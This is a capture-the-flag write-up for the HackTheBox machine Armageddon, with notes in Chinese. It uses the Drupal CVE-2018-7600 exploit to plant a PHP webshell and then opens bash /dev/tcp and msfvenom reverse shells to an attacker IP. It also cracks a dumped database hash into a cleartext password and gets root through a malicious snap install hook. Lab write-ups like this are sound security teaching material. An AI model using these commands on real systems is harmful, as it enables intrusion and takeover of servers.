# Armageddon
- URL : https://app.hackthebox.eu/machines/323
- IP : 10.129.216.90


## Recon
- nmapAutomator.sh -H 10.129.216.90 -t recon
    - 80 
    - 22
- ![](https://i.imgur.com/GqrQKh1.png)

![](https://i.imgur.com/0hkqV0B.png)

## Exploit
https://github.com/pimps/CVE-2018-7600

## Webshell
- `python3 drupa7-CVE-2018-7600.py  http://10.129.216.90/ -c "echo '<?php system(\$_GET[A]);' > s.php "`
- ![](https://i.imgur.com/rZeQanF.png)
- 確認電腦裡有 curl
    - ![](https://i.imgur.com/v2WoRRv.png)
- 下載 reverse shell
    - `curl http://10.10.16.35/s_HTB -o s`
    - 但發現戳不回來
- 傳 b374k
    - http://10.129.216.90/s.php?A=curl%20http://10.10.16.35/b374k.php%20-o%20s.php
    - 戳 reverse shell
        - ![](https://i.imgur.com/cSPqMF6.png)
        - 發現權限不足
- Try msf shell
    - `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7878 -f elf > shell1`
    - ![](https://i.imgur.com/WxuQxke.png)
- 給權限
    - ![](https://i.imgur.com/b0ynbNi.png)
    - 還是沒權限
- 試試看如果連 80 port
    - `bash -c 'bash -i >& /dev/tcp/10.10.16.35/80 0>&1'`
    - 成功

## 提權
- 收 Reverse shell
    - ![](https://i.imgur.com/dOuUK4E.png)
- 載豌豆
    - ![](https://i.imgur.com/GfPbhkr.png)
- 發現一些密碼
    - ![](https://i.imgur.com/4A71xJT.png)
    - ![](https://i.imgur.com/4VeSgm5.png)
    - drupal-6.user-password-token.database.php
    - ![](https://i.imgur.com/6Sy0DKQ.png)
- spawn
    - `perl -e 'exec "/bin/bash";'`
- dump mysql
    - `mysqldump -u drupaluser -h localhost -p drupal  > a.sql`
- 找到一組 hash
    - ![](https://i.imgur.com/TeVmSNH.png)
    - ![](https://i.imgur.com/0bxuTfa.png)
- 確認使用者名稱
    - ![](https://i.imgur.com/01spQfv.png)
- 爆破 hash
    - `hashcat -m 7900 hash.txt /opt/rockyou.txt`
    - ![](https://i.imgur.com/vApVQva.png)
- 取得帳密
    - `brucetherealadmin`
    - `booboo`
- 切換使用者
    - ![](https://i.imgur.com/BPuOHUj.png)
## 提權
- 直接用 SSH 登入
    - ![](https://i.imgur.com/4GSbLnR.png)
    - ![](https://i.imgur.com/csR3PGi.png)
    - 發現可以用 sudo snap 
- 本地
    - `gem install fpm`
    - https://gtfobins.github.io/gtfobins/snap/#sudo
- 照做提權
    - ![](https://i.imgur.com/xcf8ksJ.png)
    - ![](https://i.imgur.com/ricf9i6.png)

```bash=
COMMAND="bash -c 'bash -i >& /dev/tcp/10.10.16.35/80 0>&1'"
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```
- 傳上去
    - ![](https://i.imgur.com/EcCRXAG.png)
- 收 Reverse shell
    - ![](https://i.imgur.com/MJuVqnG.png)
- 取得 Root
    - ![](https://i.imgur.com/v8ym56k.png)
